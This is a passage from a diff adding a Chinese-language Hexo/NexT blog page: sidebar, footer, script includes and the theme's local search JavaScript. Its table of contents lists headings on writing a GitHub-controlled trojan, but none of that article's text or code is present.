+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/avatar_warcup.jpg" alt="warcup">
+          <p class="site-author-name" itemprop="name">warcup</p>
+           
+              <p class="site-description motion-element" itemprop="description">一些生活感悟和技术分享。</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">20</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/public/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/warcup" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://zhangruochi.com/" target="_blank" title="RuoChiBlogs">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                    
+                      RuoChiBlogs
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://skysec.top" target="_blank" title="SkyBlogs">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                    
+                      SkyBlogs
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#事前准备"><span class="nav-number">1.</span> <span class="nav-text">事前准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#创建模块"><span class="nav-number">2.</span> <span class="nav-text">创建模块</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#木马配置"><span class="nav-number">3.</span> <span class="nav-text">木马配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编写基于Github通信的木马"><span class="nav-number">4.</span> <span class="nav-text">编写基于Github通信的木马</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#python模块导入功能的破解"><span class="nav-number">5.</span> <span class="nav-text">python模块导入功能的破解</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">warcup</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>本站访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人次
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>本站总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+</body>
+</html>
